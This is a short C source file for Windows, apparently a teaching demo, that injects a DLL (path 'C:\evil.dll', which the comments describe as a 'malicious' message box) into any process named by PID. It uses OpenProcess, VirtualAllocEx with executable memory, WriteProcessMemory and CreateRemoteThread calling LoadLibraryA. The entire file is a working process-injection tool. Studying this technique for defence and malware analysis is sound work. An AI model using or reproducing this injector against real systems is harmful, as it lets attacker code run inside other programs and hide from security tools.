#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// "malicious" DLL: our messagebox
char maliciousDLL[] = "C:\\evil.dll";
unsigned int dll_length = sizeof(maliciousDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE process_handle; // Handle for the target process
  HANDLE remote_thread; // Handle for the remote thread
  PVOID remote_buffer; // Buffer in the remote process

  // Handle to kernel32 and pass it to GetProcAddress
  HMODULE kernel32_handle = GetModuleHandle("kernel32.dll");
  if (!kernel32_handle) {
    printf("GetModuleHandle failed. Error: %d\n", GetLastError());
    return -1;
  }

  VOID *lbuffer = GetProcAddress(kernel32_handle, "LoadLibraryA");
  if (!lbuffer) {
    printf("GetProcAddress failed. Error: %d\n", GetLastError());
    return -1;
  }

  // Parse the target process ID
  if (argc < 2 || atoi(argv[1]) == 0) {
    printf("Target Process ID not found or invalid :( exiting...\n");
    return -1;
  }

  printf("Target Process ID: %i\n", atoi(argv[1]));
  process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
  if (!process_handle) {
    printf("OpenProcess failed. Error: %d\n", GetLastError());
    return -1;
  }

  // Allocate memory in the target process for remote buffer
  remote_buffer = VirtualAllocEx(process_handle, NULL, dll_length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  if (!remote_buffer) {
    printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
    CloseHandle(process_handle);
    return -1;
  }

  // Copy DLL from our process to the remote process
  if (!WriteProcessMemory(process_handle, remote_buffer, maliciousDLL, dll_length, NULL)) {
    printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
    VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
    CloseHandle(process_handle);
    return -1;
  }

  // Create a remote thread in the target process to start our "malicious" DLL
  remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lbuffer, remote_buffer, 0, NULL);
  if (!remote_thread) {
    printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
    VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
    CloseHandle(process_handle);
    return -1;
  }

  WaitForSingleObject(remote_thread, INFINITE);
  CloseHandle(remote_thread);
  VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
  CloseHandle(process_handle);

  return 0;
}
